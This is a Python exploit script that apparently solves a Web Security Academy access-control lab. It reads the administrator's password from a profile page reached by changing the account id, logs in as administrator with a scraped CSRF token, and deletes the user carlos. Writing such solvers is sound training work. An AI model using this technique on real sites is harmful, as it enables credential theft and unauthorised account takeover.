import requests
from bs4 import BeautifulSoup

site = "0a83004d04ccc59481c52f320043002a.web-security-academy.net"
base_url = f"https://{site}"
s = requests.Session()

# Step 1: Login as wiener
s.post(f"{base_url}/login", data={"username": "wiener", "password": "peter"})

# Step 2: Leak password by accessing administrator’s profile page
resp = s.get(f"{base_url}/my-account?id=administrator")
soup = BeautifulSoup(resp.text, "html.parser")
password_input = soup.find("input", {"name": "password"})

if not password_input:
    print("[!] No password leaked.")
    exit(1)

leaked_password = password_input.get("value")
print(f"[✓] Leaked admin password: {leaked_password}")

# Step 3: Start new session and login as administrator
admin_sess = requests.Session()
login_page = admin_sess.get(f"{base_url}/login")
soup = BeautifulSoup(login_page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"}).get("value")

login_payload = {
    "csrf": csrf,
    "username": "administrator",
    "password": leaked_password
}
admin_sess.post(f"{base_url}/login", data=login_payload)

# Step 4: Access /admin and delete Carlos
delete_url = f"{base_url}/admin/delete?username=carlos"
resp = admin_sess.get(delete_url)

if "Congratulations" in resp.text:
    print("[✓] Successfully deleted carlos and solved the lab.")
else:
    print("[!] Carlos deletion failed.")
